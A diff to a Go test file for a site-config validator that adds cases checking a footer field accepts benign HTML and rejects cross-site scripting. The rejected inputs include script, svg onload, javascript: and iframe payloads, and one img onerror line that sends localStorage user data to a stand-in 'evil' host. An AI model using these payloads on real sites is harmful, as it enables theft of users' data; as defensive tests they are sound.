@@ -1,6 +1,7 @@
 package siteconfig
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/QuantumNous/new-api/internal/platform/apperr"
@@ -26,6 +27,16 @@ func TestValidatePatch(t *testing.T) {
 		{"custom_html whitespace ok", SiteConfigPatch{CustomHTML: strptr("   ")}, ""},
 		{"basic fields ok", SiteConfigPatch{SiteName: strptr("Acme"), Footer: strptr("(c) 2026")}, ""},
 		{"reserved fields stored ok", SiteConfigPatch{TemplateKey: strptr("B"), BannerJSON: strptr("[]"), EnabledModules: []string{"x"}}, ""},
+		// Footer：允许良性 HTML（链接/加粗），拒绝脚本 / 事件处理器 / 危险标签 / 伪协议 / 超长。
+		{"footer plain ok", SiteConfigPatch{Footer: strptr("© 2026 我的站")}, ""},
+		{"footer benign link ok", SiteConfigPatch{Footer: strptr(`<a href="/tos">条款</a> · <b>联系</b>`)}, ""},
+		{"footer empty ok", SiteConfigPatch{Footer: strptr("")}, ""},
+		{"footer script blocked", SiteConfigPatch{Footer: strptr("<script>alert(1)</script>")}, "FOOTER_INVALID"},
+		{"footer img onerror blocked", SiteConfigPatch{Footer: strptr(`<img src=x onerror="fetch('//evil/?c='+localStorage.user)">`)}, "FOOTER_INVALID"},
+		{"footer svg onload blocked", SiteConfigPatch{Footer: strptr(`<svg onload=alert(1)>`)}, "FOOTER_INVALID"},
+		{"footer js uri blocked", SiteConfigPatch{Footer: strptr(`<a href="javascript:alert(1)">x</a>`)}, "FOOTER_INVALID"},
+		{"footer iframe blocked", SiteConfigPatch{Footer: strptr(`<iframe src="//evil"></iframe>`)}, "FOOTER_INVALID"},
+		{"footer too long blocked", SiteConfigPatch{Footer: strptr(strings.Repeat("a", MaxFooterBytes+1))}, "FOOTER_INVALID"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
